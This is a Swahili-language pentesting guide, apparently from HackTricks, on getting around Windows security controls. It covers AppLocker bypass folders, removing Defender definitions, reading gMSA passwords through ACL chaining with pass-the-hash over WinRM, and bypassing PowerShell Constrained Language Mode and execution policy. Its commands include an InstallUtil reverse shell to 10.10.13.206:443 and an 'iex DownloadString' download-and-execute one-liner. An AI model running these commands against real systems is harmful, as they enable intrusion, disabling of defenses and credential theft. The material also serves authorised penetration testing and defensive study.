# Udhibiti wa Usalama wa Windows

{{#include ../../banners/hacktricks-training.md}}

## Sera ya AppLocker

Orodha ya kuruhusu programu (application whitelist) ni orodha ya programu au faili zinazotekelezeka zilizoidhinishwa ambazo zinaruhusiwa kuwepo na kuendeshwa kwenye mfumo. Lengo ni kulinda mazingira dhidi ya malware hatari na programu zisizoidhinishwa ambazo haziendani na mahitaji mahususi ya biashara ya shirika.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) ni **suluhisho la Microsoft la application whitelisting** na huwapa wasimamizi wa mfumo udhibiti wa **programu na faili ambazo watumiaji wanaweza kuendesha**. Hutoa **udhibiti wa kina** juu ya faili zinazotekelezeka, scripts, faili za Windows installer, DLLs, programu zilizofungashwa, na installers za programu zilizofungashwa.\
Ni jambo la kawaida kwa mashirika **kuzuia cmd.exe na PowerShell.exe** na kuandika ufikiaji kwenye saraka fulani, **lakini yote haya yanaweza kupitwa**.

### Kagua

Kagua ni faili/extensions zipi zimeorodheshwa kama zilizozuiwa/zinazoruhusiwa:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Njia hii ya registry ina mipangilio na sera zinazotumiwa na AppLocker, na hutoa njia ya kukagua seti ya sasa ya sheria zinazotekelezwa kwenye mfumo:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** muhimu za kufanya bypass ya AppLocker Policy: Ikiwa AppLocker inaruhusu kutekeleza chochote ndani ya `C:\Windows\System32` au `C:\Windows`, kuna **writable folders** unazoweza kutumia kufanya **bypass** hii.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Binaries za [**"LOLBAS's"**](https://lolbas-project.github.io/) **zinazoaminika** kwa kawaida pia zinaweza kuwa muhimu katika kupita AppLocker.
- **Rules zilizoandikwa vibaya pia zinaweza kupitwa**
- Kwa mfano, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, unaweza kuunda **folder inayoitwa `allowed`** mahali popote na itaruhusiwa.
- Organizations pia mara nyingi huzingatia **kuzuia executable ya `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, lakini husahau kuhusu **maeneo mengine ya executable za** [**PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) kama `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` au `PowerShell_ISE.exe`.
- **Utekelezaji wa DLL huwashwa mara chache sana** kwa sababu ya mzigo wa ziada unaoweza kuweka kwenye mfumo, pamoja na kiasi cha testing kinachohitajika kuhakikisha hakuna kitakachoharibika. Kwa hiyo, kutumia **DLLs kama backdoors kutasaidia kupita AppLocker**.
- Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **kutekeleza** code ya **Powershell** katika process yoyote na kupita AppLocker. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Uhifadhi wa Credentials

### Security Accounts Manager (SAM)

Credentials za ndani zipo katika faili hili, passwords zime-hash.

### Local Security Authority (LSA) - LSASS

**Credentials** (zilizo-hash) **huhifadhiwa** katika **memory** ya subsystem hii kwa sababu za Single Sign-On.\
**LSA** husimamia **security policy** ya ndani (password policy, permissions za users...), **authentication**, **access tokens**...\
LSA ndiyo **itakayokagua** credentials zilizotolewa ndani ya faili ya **SAM** (kwa local login) na **kuwasiliana** na **domain controller** ili ku-authenticate domain user.

**Credentials** **huhifadhiwa** ndani ya **process ya LSASS**: Kerberos tickets, NT na LM hashes, passwords ambazo zinaweza ku-decrypt kwa urahisi.

### LSA secrets

LSA inaweza kuhifadhi baadhi ya credentials kwenye disk:

- Password ya computer account ya Active Directory (domain controller isiyofikika).
- Passwords za accounts za Windows services
- Passwords za scheduled tasks
- Mengine (password ya IIS applications...)

### NTDS.dit

Hii ni database ya Active Directory. Inapatikana tu katika Domain Controllers.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) ni Antivirus inayopatikana katika Windows 10 na Windows 11, pamoja na matoleo ya Windows Server. **Huzuia** zana za kawaida za pentesting kama vile **`WinPEAS`**. Hata hivyo, kuna njia za **kupita ulinzi huu**.

### Kukagua

Ili kukagua **status** ya **Defender**, unaweza kutekeleza PS cmdlet **`Get-MpComputerStatus`** (kagua thamani ya **`RealTimeProtectionEnabled`** ili kujua ikiwa iko active):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Ili ku-enumerate, unaweza pia ku-run:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS hulinda faili kupitia encryption, kwa kutumia **symmetric key** inayojulikana kama **File Encryption Key (FEK)**. Key hii hu-encryptiwa kwa **public key** ya mtumiaji na kuhifadhiwa ndani ya **alternative data stream** ya $EFS ya faili iliyo-encryptiwa. Decryption inapohitajika, **private key** inayolingana ya digital certificate ya mtumiaji hutumiwa ku-decrypt FEK kutoka kwenye stream ya $EFS. Maelezo zaidi yanapatikana [hapa](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios bila user initiation** zinajumuisha:

- Faili au folders zinapohamishwa kwenda kwenye non-EFS file system, kama [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), hu-decryptiwa automatically.
- Faili zilizo-encryptiwa zinazotumwa kupitia network kwa kutumia SMB/CIFS protocol hu-decryptiwa kabla ya transmission.

Njia hii ya encryption humwezesha owner kupata **transparent access** kwa faili zilizo-encryptiwa. Hata hivyo, kubadilisha tu password ya owner na ku-login hakutaruhusu decryption.

**Key Takeaways**:

- EFS hutumia symmetric FEK, iliyo-encryptiwa kwa public key ya mtumiaji.
- Decryption hutumia private key ya mtumiaji kufikia FEK.
- Automatic decryption hutokea chini ya conditions maalum, kama kunakili kwenda FAT32 au network transmission.
- Faili zilizo-encryptiwa zinaweza kufikiwa na owner bila hatua za ziada.

### Check EFS info

Angalia kama **user** **ametumia** **service** hii kwa ku-check kama path hii ipo:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Angalia **nani** ana **access** kwa faili kwa kutumia cipher /c \<file>\
Unaweza pia kutumia `cipher /e` na `cipher /d` ndani ya folder ili **ku-encrypt** na **ku-decrypt** faili zote

### Decrypting EFS files

#### Being Authority System

Njia hii inahitaji **victim user** awe **ana-run** **process** ndani ya host. Ikiwa ndivyo, kwa kutumia `meterpreter` sessions unaweza ku-impersonate token ya process ya user (`impersonate_token` kutoka `incognito`). Au unaweza tu kufanya `migrate` kwenda kwenye process ya user.

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ilitengeneza **Group Managed Service Accounts (gMSA)** ili kurahisisha usimamizi wa service accounts katika IT infrastructures. Tofauti na traditional service accounts ambazo mara nyingi huwa na setting ya "**Password never expire**" ikiwa enabled, gMSAs hutoa solution iliyo salama zaidi na rahisi kusimamia:

- **Automatic Password Management**: gMSAs hutumia password yenye complex ya characters 240 ambayo hubadilika automatically kulingana na domain au computer policy. Mchakato huu hushughulikiwa na Microsoft's Key Distribution Service (KDC), hivyo kuondoa hitaji la manual password updates.
- **Enhanced Security**: Accounts hizi hazitaathiriwa na lockouts na haziwezi kutumiwa kwa interactive logins, jambo linaloongeza security yake.
- **Multiple Host Support**: gMSAs zinaweza kushirikiwa kwenye hosts nyingi, hivyo kuwa bora kwa services zinazo-run kwenye servers nyingi.
- **Scheduled Task Capability**: Tofauti na managed service accounts, gMSAs zinaunga mkono ku-run scheduled tasks.
- **Simplified SPN Management**: System husasisha automatically Service Principal Name (SPN) kunapokuwa na mabadiliko kwenye sAMaccount details au DNS name ya computer, hivyo kurahisisha SPN management.

Passwords za gMSAs huhifadhiwa kwenye LDAP property _**msDS-ManagedPassword**_ na hu-resetiwa automatically kila baada ya siku 30 na Domain Controllers (DCs). Password hii, ambayo ni encrypted data blob inayojulikana kama [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e), inaweza kuretrieved tu na authorized administrators na servers ambazo gMSAs zimewekwa, hivyo kuhakikisha environment salama. Ili kufikia taarifa hii, secured connection kama LDAPS inahitajika, au connection lazima iwe authenticated kwa 'Sealing & Secure'.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Unaweza kusoma password hii kwa kutumia [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup>
```
/GMSAPasswordReader --AccountName jkohler
```
[**Pata maelezo zaidi katika chapisho hili**](https://cube0x0.github.io/Relaying-for-gMSA/)

Pia, angalia [ukurasa huu wa wavuti](https://cube0x0.github.io/Relaying-for-gMSA/) kuhusu jinsi ya kutekeleza **NTLM relay attack** ili **kusoma** **password** ya **gMSA**.<sup>[[1]](#references)</sup>

### Kutumia vibaya ACL chaining kusoma managed password ya gMSA (GenericAll -> ReadGMSAPassword)

Katika mazingira mengi, watumiaji wenye privileges ndogo wanaweza kufikia secrets za gMSA bila ku-compromise DC kwa kutumia vibaya object ACLs zilizosanidiwa vibaya:<sup>[[3]](#references)</sup>

- Group unayoweza kuidhibiti (kwa mfano, kupitia GenericAll/GenericWrite) imepewa `ReadGMSAPassword` juu ya gMSA.
- Kwa kujiongeza kwenye group hiyo, unarithi haki ya kusoma blob ya `msDS-ManagedPassword` ya gMSA kupitia LDAP na kupata credentials za NTLM zinazoweza kutumika.

Mtiririko wa kawaida wa kazi:

1) Gundua njia hiyo kwa BloodHound na uweke foothold principals zako kama Owned. Tafuta edges kama hizi:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Jiongeze kwenye intermediate group unayoidhibiti (mfano kwa kutumia bloodyAD):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) Soma nenosiri linalosimamiwa la gMSA kupitia LDAP na uunde NTLM hash. NetExec huendesha kiotomatiki uchimbaji wa `msDS-ManagedPassword` na ubadilishaji kuwa NTLM:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) Thibitisha utambulisho kama gMSA kwa kutumia NTLM hash (plaintext haihitajiki). Ikiwa akaunti iko kwenye Remote Management Users, WinRM itafanya kazi moja kwa moja:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notes:
- LDAP reads za `msDS-ManagedPassword` zinahitaji sealing (k.m., LDAPS/sign+seal). Tools hushughulikia hili kiotomatiki.
- gMSAs mara nyingi hupewa local rights kama WinRM; thibitisha group membership (k.m., Remote Management Users) ili kupanga lateral movement.
- Ikiwa unahitaji blob tu ili kuhesabu NTLM mwenyewe, tazama muundo wa MSDS-MANAGEDPASSWORD_BLOB.



## LAPS

**Local Administrator Password Solution (LAPS)**, inayopatikana kupakuliwa kutoka [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), huwezesha usimamizi wa local Administrator passwords. Passwords hizi, ambazo ni **randomized**, za kipekee, na **hubadilishwa mara kwa mara**, huhifadhiwa katikati katika Active Directory. Ufikiaji wa passwords hizi huzuiwa kupitia ACLs kwa users walioidhinishwa. Kwa permissions za kutosha zilizotolewa, uwezo wa kusoma local admin passwords hutolewa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hufunga vipengele vingi** vinavyohitajika kutumia PowerShell kwa ufanisi, kama vile kuzuia COM objects, kuruhusu tu .NET types zilizoidhinishwa, XAML-based workflows, PowerShell classes, na vingine.

### **Kagua**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Katika Windows za sasa, Bypass hiyo haitafanya kazi, lakini unaweza kutumia [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Ili kuicompile unaweza kuhitaji** **ku** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> kuongeza `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` na **kubadilisha project kuwa .Net4.5**.

#### Bypass ya moja kwa moja:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
Unaweza kutumia [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) au [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) ili **execute Powershell** code katika process yoyote na kupita constrained mode. Kwa maelezo zaidi angalia: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Sera ya Utekelezaji ya PS

Kwa chaguo-msingi imewekwa kuwa **restricted.** Njia kuu za kupita sera hii:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Zaidi yanaweza kupatikana [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

Ni API inayoweza kutumika ku-authenticate users.

SSPI itawajibika kutafuta protocol inayofaa kwa machines mbili zinazotaka kuwasiliana. Njia inayopendelewa kwa hili ni Kerberos. Kisha SSPI itafanya negotiation ya authentication protocol itakayotumika; authentication protocols hizi huitwa Security Support Provider (SSP), ziko ndani ya kila Windows machine katika mfumo wa DLL, na machines zote mbili lazima zi-support SSP hiyo hiyo ili ziweze kuwasiliana.

### Main SSPs

- **Kerberos**: Inayopendelewa
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** na **NTLMv2**: Kwa sababu za compatibility
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers na LDAP, password ikiwa katika mfumo wa MD5 hash
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL na TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Hutumika kufanya negotiation ya protocol itakayotumika (Kerberos au NTLM, ambapo Kerberos ndiyo default)
- %windir%\Windows\System32\lsasrv.dll

#### Negotiation inaweza kutoa methods kadhaa au method moja pekee.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **consent prompt kwa elevated activities**.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
